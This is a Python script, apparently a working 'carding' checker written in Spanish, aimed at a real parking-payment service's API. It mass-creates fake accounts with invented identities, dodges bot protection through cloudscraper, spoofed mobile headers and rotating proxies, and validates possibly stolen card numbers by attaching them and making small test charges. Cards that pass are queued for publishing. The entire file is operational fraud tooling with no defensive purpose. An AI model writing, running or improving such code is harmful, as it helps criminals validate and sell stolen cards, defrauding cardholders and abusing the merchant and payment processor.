import os
import random
import time
import requests
import cloudscraper
import string
from publisher import insert_pending
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("verificador")

API_BASE = "https://parkingpay-api-prod.azurewebsites.net"
REGISTER_URL = f"{API_BASE}/api/app/usuarios/registro"
LOGIN_URL = f"{API_BASE}/api/auth"
TARJETAS_URL = f"{API_BASE}/api/app/conductor/tarjetas"
CONDUCTOR_URL = f"{API_BASE}/api/app/conductor"
ABONO_URL = f"{API_BASE}/api/app/conductor/pagos/abono"

NOMBRES = [
    "Juan","Pedro","Luis","Carlos","Miguel","Jose","Francisco","Antonio","Alejandro","Javier",
    "Ricardo","Fernando","Roberto","Sergio","Arturo","Maria","Ana","Laura","Carmen","Rosa",
    "Guadalupe","Martha","Patricia","Gabriela","Alejandra","Adriana","Monica","Veronica","Claudia","Sandra"
]

APELLIDOS = [
    "Garcia","Lopez","Martinez","Rodriguez","Hernandez","Gonzalez","Perez","Sanchez",
    "Ramirez","Cruz","Flores","Morales","Vazquez","Jimenez","Torres","Reyes","Castillo","Ortiz","Mendoza","Ruiz"
]

DOMINIOS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "proton.me"]

MONTOS = {
    "1": (1.0, "$1 MXN CARGO"),
    "2": (20.0, "$20 MXN ABONO"),
    "3": (50.0, "$50 MXN ABONO"),
    "4": (100.0, "$100 MXN ABONO")
}

USED_PHONES = set()

def random_string(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def random_phone():
    lada = random.choice(["33","55","81","449","222","477","686","664","612","667"])
    for _ in range(100):
        phone = lada + "".join(random.choices("0123456789", k=7))
        if phone not in USED_PHONES:
            USED_PHONES.add(phone)
            return phone
    return lada + str(int(time.time()))[-7:]

def random_email():
    timestamp = int(time.time() * 1000) % 100000
    return f"{random_string(6)}{timestamp}@{random.choice(DOMINIOS)}"

def random_password():
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))

def format_proxy(s):
    if not s:
        return None
    s = s.strip()
    if s.startswith("http://") or s.startswith("https://"):
        return s
    parts = s.split(":")
    if len(parts) == 4:
        if "." in parts[2]:
            user, pwd, host, port = parts
        else:
            host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{s}"
    return None

def cargar_proxies():
    try:
        with open("proxies.txt", "r") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        logger.warning("proxies.txt no encontrado.")
        return []

def registrar_cuenta(proxy_url, intentos=3):
    for intento in range(1, intentos + 1):
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True},
            delay=2
        )
        if proxy_url:
            scraper.proxies = {"http": proxy_url, "https": proxy_url}
        headers = {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json; charset=utf-8",
            "accept": "application/json"
        }
        nombre = random.choice(NOMBRES)
        apellido = random.choice(APELLIDOS)
        email = random_email()
        password = random_password()
        telefono = random_phone()
        datos = {
            "Nombre": nombre,
            "Apellidos": apellido,
            "Telefono": telefono,
            "CorreoElectronico": email,
            "Contrasena": password,
            "ConfirmarContrasena": password,
        }
        logger.info("Intento %d: registrando cuenta. Proxy=%s Payload=%s", intento, proxy_url, datos)
        try:
            r = scraper.post(REGISTER_URL, json=datos, headers=headers, timeout=15)
            # Loguear siempre el cuerpo de la respuesta para diagnosticar 400s
            body_snippet = (r.text[:1000] + '...') if r.text and len(r.text) > 1000 else r.text
            logger.info("Registro response: %s\n%s", r.status_code, body_snippet)
            # detecta API apagada
            if r.status_code == 403 and "stopped" in (r.text or "").lower():
                logger.error("API apagada")
                return None
            if r.status_code not in (200, 201):
                # si es 400/422, intenta variante con claves en minúscula y loguea detalle JSON si existe
                try:
                    parsed = r.json()
                    logger.warning("Detalle error JSON registro: %s", parsed)
                except Exception:
                    logger.warning("Respuesta no JSON: %s", r.text[:500])
                # Si fue 400, intentar con keys en minúscula una vez
                if r.status_code == 400:
                    alt = {k.lower(): v for k, v in datos.items()}
                    logger.info("Reintentando registro con claves en minúscula: %s", alt)
                    r2 = scraper.post(REGISTER_URL, json=alt, headers=headers, timeout=15)
                    logger.info("Segundo intento status %s body: %s", r2.status_code, r2.text[:500])
                    if r2.status_code in (200, 201):
                        login_data = {"CorreoElectronico": alt.get("correoelectronico", email), "Contrasena": password}
                        r_login = scraper.post(LOGIN_URL, json=login_data, headers=headers, timeout=15)
                        if r_login.status_code in (200, 201):
                            data = r_login.json()
                            token = data.get("token")
                            if token:
                                logger.info("Cuenta creada (segunda variante): %s", alt.get("correoelectronico"))
                                return token
                time.sleep(2)
                continue
            # si registro OK, intentar login
            login_data = {"CorreoElectronico": email, "Contrasena": password}
            r2 = scraper.post(LOGIN_URL, json=login_data, headers=headers, timeout=15)
            logger.info("Login status: %s body: %s", r2.status_code, (r2.text[:500] if r2.text else ""))
            if r2.status_code in (200, 201):
                try:
                    data = r2.json()
                except Exception:
                    logger.error("Login devolvió no-JSON")
                    time.sleep(1)
                    continue
                token = data.get("token")
                if token:
                    logger.info("Cuenta creada: %s", email)
                    return token
            time.sleep(1)
        except Exception as e:
            logger.exception("Error registro: %s", e)
            time.sleep(2)
    return None

def check_card(cc, mes, ano, cvv, monto, monto_nombre, token, proxy_url, bin_info=None):
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True},
        delay=2
    )
    if proxies:
        scraper.proxies = proxies
    headers = {
        "user-agent": "Dart/2.18 (dart:io)",
        "content-type": "application/json; charset=utf-8",
        "accept-encoding": "gzip",
        "authorization": token,
        "host": "parkingpay-api-prod.azurewebsites.net",
    }
    display = f"{cc}|{mes}|{ano}|{cvv}"
    try:
        r1 = scraper.post(
            TARJETAS_URL,
            json={"numero": cc, "expiracionMes": f"{int(mes):02d}", "expiracionYear": str(ano)},
            headers=headers,
            timeout=15
        )
        if r1.status_code == 403 and "stopped" in r1.text:
            return "token_expired", display, "TOKEN EXPIRADO"
        if r1.status_code != 200:
            return "dead", display, "DEAD"
        try:
            data = r1.json()
            stripe_id = data.get("stripeCardId")
            if not stripe_id:
                return "dead", display, "DEAD"
        except:
            return "dead", display, "DEAD"
        if monto == 1.0:
            return "live", display, "$1 MXN CARGO"
        time.sleep(1)
        r2 = scraper.get(CONDUCTOR_URL, headers=headers, timeout=15)
        if r2.status_code != 200:
            return "dead", display, "DEAD"
        tarjeta_id = None
        for t in r2.json().get("cartera", {}).get("tarjetas", []):
            if t.get("stripeInfo", {}).get("stripeCardId") == stripe_id:
                tarjeta_id = t.get("tarjetaId")
                break
        if not tarjeta_id:
            return "dead", display, "DEAD"
        time.sleep(1)
        r3 = scraper.post(
            ABONO_URL,
            json={"tarjetaId": tarjeta_id, "porAbonar": monto},
            headers=headers,
            timeout=15
        )
        if r3.status_code == 200:
            return "live", display, monto_nombre
        elif "No se pudo generar" in r3.text:
            return "dead", display, "Fondos insuficientes"
        else:
            error_msg = r3.text[:80] if r3.text else f"HTTP {r3.status_code}"
            if "20, 50 o 100" in error_msg:
                return "live", display, "$1 MXN CARGO"
            return "dead", display, "DEAD"
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
        return "error", display, "API NO DISPONIBLE"
    except Exception as e:
        return "error", display, str(e)[:80]

def flush_lives():
    from publisher import publish_pending_cards, get_pending_count
    pendientes = get_pending_count()
    if pendientes == 0:
        logger.info("No hay tarjetas pendientes.")
        return 0
    logger.info("Publicando %d tarjetas...", pendientes)
    enviadas = publish_pending_cards()
    logger.info("Publicadas %d/%d", enviadas, pendientes)
    return enviadas
